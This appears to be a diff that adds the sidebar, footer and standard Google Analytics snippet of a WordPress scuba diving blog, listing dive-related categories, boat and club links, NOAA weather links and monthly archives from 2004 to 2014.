+	<li class="cat-item cat-item-27"><a href="http://www.sjue.com/blog/category/faq/" title="A brief description of SCUBA concepts">FAQs</a>
+<ul class='children'>
+	<li class="cat-item cat-item-29"><a href="http://www.sjue.com/blog/category/faq/faqbasic/" title="What is SCUBA?">Basic SCUBA</a>
+</li>
+	<li class="cat-item cat-item-30"><a href="http://www.sjue.com/blog/category/faq/faq-adv/" title="Technical / Advanced">Tech / Advanced</a>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-37"><a href="http://www.sjue.com/blog/category/archive-aka-film/" title="Some older shots">Gallery Archive (aka Film)</a>
+</li>
+	<li class="cat-item cat-item-31"><a href="http://www.sjue.com/blog/category/surface/" title="General discussion">Surface Interval</a>
+</li>
+	<li class="cat-item cat-item-23"><a href="http://www.sjue.com/blog/category/uwphotos/" title="Trips with photos">U/W Photos</a>
+</li>
+		</ul>
+</li><li id="pages-2" class="widget widget_pages"><h2 class="widgettitle">Pages</h2>		<ul>
+			<li class="page_item page-item-831"><a href="http://www.sjue.com/blog/2013-events/">2014 Events</a></li>
+<li class="page_item page-item-197"><a href="http://www.sjue.com/blog/intro/">Intro</a></li>
+<li class="page_item page-item-2"><a href="http://www.sjue.com/blog/about/">About</a></li>
+<li class="page_item page-item-87"><a href="http://www.sjue.com/blog/classes/">Classes</a></li>
+<li class="page_item page-item-741"><a href="http://www.sjue.com/blog/photo-galleries/">Photo Galleries</a></li>
+		</ul>
+		</li><li id="linkcat-6" class="widget widget_links"><h2 class="widgettitle">Boats</h2>
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.fourcault.be" title="A great Belguim dive platform!" target="_blank">Cdt. Fourcault (Belgium)</a></li>
+<li><a href="http://dinadee.com">Dina Dee II</a></li>
+<li><a href="http://www.john-jack.com/">John Jack</a></li>
+<li><a href="http://">Venture III</a></li>
+
+	</ul>
+</li>
+<li id="linkcat-7" class="widget widget_links"><h2 class="widgettitle">Links</h2>
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.fourcault.be" title="A great Belguim dive platform!" target="_blank">Cdt. Fourcault (Belgium)</a></li>
+<li><a href="http://www.KissRebreathers.com">KISS Rebreathers</a></li>
+<li><a href="http://liquidproductionsllc.com" title="Great Photography and Videography from Becky Kagan!">Liquid Productions</a></li>
+<li><a href="http://naui.org">NAUI</a></li>
+<li><a href="http://diveneptunesrealm.com">Neptune&#039;s Realm Scuba</a></li>
+<li><a href="http://www.ndbc.noaa.gov/maps/Northeast.shtml" title="Current sea state reported by NOAA" target="_blank">NOAA Data Bouy</a></li>
+<li><a href="http://www.erh.noaa.gov/er/phi/" target="_blank">NOAA Weather Map</a></li>
+<li><a href="http://sjdiver.com/photo" title="Gallery of underwater and scuba photos." target="_blank">Photo Gallery</a></li>
+<li><a href="http://scubadelphia.com">Scubadelphia</a></li>
+<li><a href="http://thediveshopnj.com" target="_blank">The Dive Shop</a></li>
+
+	</ul>
+</li>
+<li id="archives-2" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>		<ul>
+			<li><a href='http://www.sjue.com/blog/2014/06/' title='June 2014'>June 2014</a></li>
+	<li><a href='http://www.sjue.com/blog/2014/05/' title='May 2014'>May 2014</a></li>
+	<li><a href='http://www.sjue.com/blog/2013/08/' title='August 2013'>August 2013</a></li>
+	<li><a href='http://www.sjue.com/blog/2013/03/' title='March 2013'>March 2013</a></li>
+	<li><a href='http://www.sjue.com/blog/2012/04/' title='April 2012'>April 2012</a></li>
+	<li><a href='http://www.sjue.com/blog/2012/03/' title='March 2012'>March 2012</a></li>
+	<li><a href='http://www.sjue.com/blog/2011/09/' title='September 2011'>September 2011</a></li>
+	<li><a href='http://www.sjue.com/blog/2011/07/' title='July 2011'>July 2011</a></li>
+	<li><a href='http://www.sjue.com/blog/2011/06/' title='June 2011'>June 2011</a></li>
+	<li><a href='http://www.sjue.com/blog/2011/02/' title='February 2011'>February 2011</a></li>
+	<li><a href='http://www.sjue.com/blog/2011/01/' title='January 2011'>January 2011</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/12/' title='December 2010'>December 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/11/' title='November 2010'>November 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/10/' title='October 2010'>October 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/09/' title='September 2010'>September 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/08/' title='August 2010'>August 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/07/' title='July 2010'>July 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/05/' title='May 2010'>May 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/04/' title='April 2010'>April 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2010/02/' title='February 2010'>February 2010</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/12/' title='December 2009'>December 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/11/' title='November 2009'>November 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/10/' title='October 2009'>October 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/09/' title='September 2009'>September 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/08/' title='August 2009'>August 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/07/' title='July 2009'>July 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/06/' title='June 2009'>June 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/05/' title='May 2009'>May 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/04/' title='April 2009'>April 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/02/' title='February 2009'>February 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2009/01/' title='January 2009'>January 2009</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/11/' title='November 2008'>November 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/10/' title='October 2008'>October 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/09/' title='September 2008'>September 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/08/' title='August 2008'>August 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/07/' title='July 2008'>July 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/06/' title='June 2008'>June 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/05/' title='May 2008'>May 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2008/02/' title='February 2008'>February 2008</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/12/' title='December 2007'>December 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/11/' title='November 2007'>November 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/10/' title='October 2007'>October 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/08/' title='August 2007'>August 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/07/' title='July 2007'>July 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/06/' title='June 2007'>June 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/05/' title='May 2007'>May 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2007/04/' title='April 2007'>April 2007</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/11/' title='November 2006'>November 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/10/' title='October 2006'>October 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/09/' title='September 2006'>September 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/08/' title='August 2006'>August 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/06/' title='June 2006'>June 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/05/' title='May 2006'>May 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2006/04/' title='April 2006'>April 2006</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/11/' title='November 2005'>November 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/10/' title='October 2005'>October 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/09/' title='September 2005'>September 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/08/' title='August 2005'>August 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/06/' title='June 2005'>June 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/05/' title='May 2005'>May 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2005/02/' title='February 2005'>February 2005</a></li>
+	<li><a href='http://www.sjue.com/blog/2004/09/' title='September 2004'>September 2004</a></li>
+	<li><a href='http://www.sjue.com/blog/2004/07/' title='July 2004'>July 2004</a></li>
+		</ul>
+</li><li id="meta-2" class="widget widget_meta"><h2 class="widgettitle">Meta</h2>			<ul>
+						<li><a href="http://www.sjue.com/blog/wp-login.php">Log in</a></li>
+			<li><a href="http://www.sjue.com/blog/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://www.sjue.com/blog/comments/feed/" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>
+						</ul>
+</li>		</ul>
+	</div>
+
+
+<hr />
+<div id="footer">
+<!-- If you'd like to support WordPress, having the "powered by" link somewhere on your blog is the best way; it's our only promotion or advertising. -->
+	<p>
+		Go deep, stay long is proudly powered by
+		<a href="http://wordpress.org/">WordPress</a>
+              
+		<br />
+  Copyright &copy; 2008. Theme Design by <a href="http://www.thecirclingsky.com/">The Circling Sky</a></p>
+</div>
+</div>
+
+
+		<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-6219318-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+</html>
